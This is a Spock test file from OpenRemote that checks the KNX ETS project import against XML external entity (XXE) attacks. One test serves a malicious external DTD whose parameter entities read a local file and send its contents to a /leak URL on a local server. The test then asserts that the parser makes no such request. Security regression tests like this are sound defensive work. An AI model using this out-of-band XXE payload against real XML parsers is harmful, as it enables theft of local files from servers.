/*
 * Copyright 2026, OpenRemote Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 *
 * SPDX-License-Identifier: AGPL-3.0-or-later
 */
package org.openremote.test.protocol

import com.sun.net.httpserver.HttpServer
import org.openremote.agent.protocol.knx.KNXAgent
import org.openremote.agent.protocol.knx.KNXProtocol
import org.openremote.model.asset.AssetTreeNode
import org.openremote.model.util.ValueUtil
import spock.lang.Specification

import java.nio.charset.StandardCharsets
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.function.Consumer
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class KNXImportXXETest extends Specification {

  def "KNX asset import still processes valid ETS project files"() {
    given: "a KNX protocol instance with only the import executor initialized"
    ValueUtil.initialise(null)
    def executor = Executors.newSingleThreadExecutor()
    def protocol = new TestKNXProtocol(new KNXAgent("KNX").setId("knx-agent"), executor)
    def projectFile = getClass().getResourceAsStream("/org/openremote/test/protocol/knx/knx-import-testproject.knxproj").bytes
    def assets = Collections.synchronizedList([])

    when: "a valid ETS project file is imported"
    protocol.startAssetImport(projectFile, { AssetTreeNode[] discovered ->
      assets.addAll(discovered as List)
    } as Consumer<AssetTreeNode[]>).get(10, TimeUnit.SECONDS)

    then: "the expected assets are discovered"
    assets.size() == 12
    assets.every {
      it.asset.name != null &&
              !it.asset.attributes.isEmpty()
    }

    cleanup:
    executor?.shutdownNow()
  }

  def "KNX asset import must not resolve external entities from uploaded ETS XML"() {
    given: "a local endpoint serving an attacker controlled external DTD"
    def leakedContent = "knx-xxe-${UUID.randomUUID()}"
    def secretFile = File.createTempFile("knx-xxe-", ".txt")
    secretFile.text = leakedContent
    def requestedUris = Collections.synchronizedList([])
    def server = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0)
    def port = server.address.port
    server.createContext("/") { exchange ->
      def uri = exchange.requestURI.toString()
      requestedUris.add(uri)
      byte[] body
      if (uri.startsWith("/evil.dtd")) {
        body = """<!ENTITY % file SYSTEM "${secretFile.toURI()}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:${port}/leak?x=%file;'>">
%eval;
%exfil;
""".getBytes(StandardCharsets.UTF_8)
      } else {
        body = "ok".getBytes(StandardCharsets.UTF_8)
      }
      exchange.sendResponseHeaders(200, body.length)
      exchange.responseBody.withCloseable {
        it.write(body)
      }
    }
    server.start()

    and: "a KNX ETS project archive whose 0.xml references the external DTD"
    def projectFile = etsProjectWith0Xml("""<?xml version="1.0"?>
<!DOCTYPE b:KNX SYSTEM "http://127.0.0.1:${port}/evil.dtd">
<b:KNX xmlns:b="http://knx.org/xml/project/13">
  <b:Project>
    <b:Installations>
      <b:Installation>
        <b:Topology/>
      </b:Installation>
    </b:Installations>
  </b:Project>
</b:KNX>
""")

    and: "a KNX protocol instance with only the import executor initialized"
    ValueUtil.initialise(null)
    def executor = Executors.newSingleThreadExecutor()
    def protocol = new TestKNXProtocol(new KNXAgent("KNX").setId("knx-agent"), executor)

    when: "the uploaded ETS XML is imported"
    protocol.startAssetImport(projectFile, { AssetTreeNode[] ignored -> } as Consumer<AssetTreeNode[]>).get(10, TimeUnit.SECONDS)

    then: "the parser does not make an out-of-band request containing local file contents"
    requestedUris.isEmpty()

    cleanup:
    server?.stop(0)
    executor?.shutdownNow()
    secretFile?.delete()
  }

  private static byte[] etsProjectWith0Xml(String xml) {
    def out = new ByteArrayOutputStream()
    new ZipOutputStream(out).withCloseable { zip ->
      zip.putNextEntry(new ZipEntry("P-0001/0.xml"))
      zip.write(xml.getBytes(StandardCharsets.UTF_8))
      zip.closeEntry()
    }
    return out.toByteArray()
  }

  private static class TestKNXProtocol extends KNXProtocol {
    TestKNXProtocol(KNXAgent agent, ExecutorService executorService) {
      super(agent)
      this.executorService = executorService
    }
  }
}
